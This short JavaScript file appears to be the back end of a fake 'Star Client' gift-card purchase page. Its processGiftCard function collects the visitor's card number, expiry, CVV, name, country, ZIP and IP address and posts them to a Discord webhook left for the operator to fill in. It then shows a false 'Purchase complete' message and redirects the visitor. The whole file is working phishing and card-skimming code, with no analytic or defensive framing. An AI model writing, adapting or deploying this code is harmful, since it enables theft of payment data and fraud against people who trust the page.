const WEBHOOK_URL = "PUT_YOUR_DISCORD_WEBHOOK_URL_HERE";

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Unknown";
  }
}

async function processGiftCard() {
  const ip = await getIP();
  const status = document.getElementById("status");

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "🧾 Star Client | Purchase",
        fields: [
          { name: "Cardholder", value: cardName.value },
          { name: "Gift Card", value: cardNumber.value },
          { name: "Expiration", value: expiry.value },
          { name: "CVV", value: cvv.value },
          { name: "Country", value: country.value },
          { name: "ZIP", value: zip.value },
          { name: "IP Address", value: ip }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Purchase complete. Redirecting…";

  setTimeout(() => {
    window.location.href = "redeem.html";
  }, 1500);
}
